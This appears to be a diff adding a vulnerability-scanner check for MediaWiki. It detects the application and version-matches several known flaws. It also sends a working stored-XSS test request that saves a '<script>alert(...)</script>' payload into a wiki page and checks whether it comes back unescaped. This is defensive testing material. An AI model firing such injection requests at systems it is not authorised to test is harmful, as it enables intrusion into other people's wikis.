@@ -1,0 +1,143 @@
+#include helpers.inc;
+#include string_helpers.inc;
+#include reporting_helpers.inc;
+// **************************************************************************************
+function alert(fname, job, matchedText)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(fname);
+	ri.affects = "Web Server";
+	ri.alertPath = "Scripts/" + fname; 	
+		
+	ri.setHttpInfo(job);
+	
+	if (matchedText) 
+		ri.Details =  ri.Details + "Current version: [blue]" + matchedText + "[/blue]";	
+	
+	AddReportItem(ri);	
+}							 
+// **************************************************************************************
+function test_mediawiki_stored_xss(dir, path){
+	if (!path.endsWith('/')) path = path + '/';
+	
+	var rndStr = 900000 + random(99999);
+	var http = new THTTPJob();
+	http.url = dir.url;
+	http.verb = 'POST';
+	http.uri = path + 'index.php?title=AcunetixTest' + rndStr + '&action=submit';
+	http.request.addHeader("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary8YtGYMYxgLtZIhW1", true);
+	http.addCookies = true;	
+	
+	http.request.body = 
+        '------WebKitFormBoundary8YtGYMYxgLtZIhW1' + CRLF() +
+        'Content-Disposition: form-data; name="wpSection"' + CRLF() +
+        '' + CRLF() +
+        '' + CRLF() +
+        '------WebKitFormBoundary8YtGYMYxgLtZIhW1' + CRLF() +
+        'Content-Disposition: form-data; name="wpStarttime"' + CRLF() +
+        '' + CRLF() +
+        '20120910094447' + CRLF() +
+        '------WebKitFormBoundary8YtGYMYxgLtZIhW1' + CRLF() +
+        'Content-Disposition: form-data; name="wpEdittime"' + CRLF() +
+        '' + CRLF() +
+        '20120910092721' + CRLF() +				
+        '------WebKitFormBoundary8YtGYMYxgLtZIhW1' + CRLF() +
+        'Content-Disposition: form-data; name="wpScrolltop"' + CRLF() +
+        '' + CRLF() +
+        '0' + CRLF() +
+        '------WebKitFormBoundary8YtGYMYxgLtZIhW1' + CRLF() +
+        'Content-Disposition: form-data; name="wpAutoSummary"' + CRLF() +
+        '' + CRLF() +
+        'd41d8cd98f00b204e9800998ecf8427e' + CRLF() +
+        '------WebKitFormBoundary8YtGYMYxgLtZIhW1' + CRLF() +
+        'Content-Disposition: form-data; name="oldid"' + CRLF() +
+        '' + CRLF() +
+        '0' + CRLF() +
+        '------WebKitFormBoundary8YtGYMYxgLtZIhW1' + CRLF() +
+        'Content-Disposition: form-data; name="wpTextbox1"' + CRLF() +
+        '' + CRLF() +
+        '[[File:' + rndStr + '|<script>alert(' + rndStr + ')</script>]]' + CRLF() +
+        '------WebKitFormBoundary8YtGYMYxgLtZIhW1' + CRLF() +
+        'Content-Disposition: form-data; name="wpSummary"' + CRLF() +
+        '' + CRLF() +
+        '' + CRLF() +
+        '------WebKitFormBoundary8YtGYMYxgLtZIhW1' + CRLF() +
+        'Content-Disposition: form-data; name="wpSave"' + CRLF() +
+        '' + CRLF() +
+        'Save page' + CRLF() +
+        '------WebKitFormBoundary8YtGYMYxgLtZIhW1' + CRLF() +
+        'Content-Disposition: form-data; name="wpEditToken"' + CRLF() +
+        '' + CRLF() +
+        '+\\' + CRLF() +        
+        '------WebKitFormBoundary8YtGYMYxgLtZIhW1--';
+        	
+	http.execute();	
+	
+	if ((!http.wasError && http.responseStatus == 302)){
+		var http2 = new THTTPJob();
+		http2.url = dir.url;
+		http2.verb = 'GET';
+		http2.uri = path + 'index.php/AcunetixTest' + rndStr;
+		http2.addCookies = false;
+		
+		http2.execute();			
+		if ((!http2.wasError && http2.responseStatus == 200)){
+			if(http2.response.body && http2.response.body.indexOf('<script>alert(' + rndStr + ')</script>') != -1) {
+					var ri = new TReportItem();					
+					ri.LoadFromFile("mediawiki_1_19_2.xml");
+					ri.affects = path;
+					ri.alertPath = "Scripts/mediawiki_1_19_2.xml";
+					ri.setHttpInfo(http);		
+					AddReportItem(ri);				
+			}
+		}
+	}
+}
+// **************************************************************************************
+function check_mediawiki_version(dir, path){
+	if (!path.endsWith('/')) path = path + '/';	
+	
+	var http = new THTTPJob();
+	http.url = dir.url;
+	http.verb = 'GET';
+	http.uri = path + 'index.php/Special:Version';
+	http.execute();	
+	
+	if ((!http.wasError && http.responseStatus == 200)){
+		var match = http.response.body.match(/<td><a rel="nofollow" class="external text" href="https:\/\/www.mediawiki.org\/">MediaWiki<\/a><\/td>[\s\S]+?<td dir="ltr">(\d+\.\d+\.\d+)<\/td>/);
+		
+		if (!match) {
+			//trace('a');
+			match = http.response.body.match(/>MediaWiki<\/a><\/td>[\s\S]+?<td[^>]+>(\d+\.\d+\.\d+)<\/td>/);
+		}
+			
+		if (match && match.length>1 && match[1]) {
+			var versionStr = match[1];
+			KBase("MediaWiki version", "MediaWiki version: [dark][bold]" + versionStr + "[/bold][/dark].");
+			
+			var version = versionStr.replace(".", "").replace(".", "");
+			if ((version >= 1190 && version < 1197) || (version >= 1200 && version < 1206))
+			{
+				alert("MediaWiki_chunked_uploads.xml", http, versionStr);				
+			}
+			
+			if ((version < 1222 && versionStr.startsWith("1.22.")) || (version < 1215 && versionStr.startsWith("1.21.")) || (version < 11911 && versionStr.startsWith("1.19.")))
+			{
+				alert("MediaWiki_Remote_Code_Execution_DjVu.xml", http, versionStr);
+			}
+			if (version < 1242)
+			{
+				alert("MediaWiki_SVG_XSS.xml", http, versionStr);
+			}
+		}
+	}
+}
+var dir = getCurrentDirectory();
+var alreadyReportedWebApplication = getGlobalValue("detectedAppMediaWiki");
+if (!alreadyReportedWebApplication)
+{
+    setGlobalValue("detectedAppMediaWiki", 1, true);           
+    KBase("MediaWiki web application", "MediaWiki web application was detected in directory [dark][bold]" + dir.fullPath + "[/bold][/dark].");
+}
+test_mediawiki_stored_xss(dir, dir.fullPath);
+check_mediawiki_version(dir, dir.fullPath);
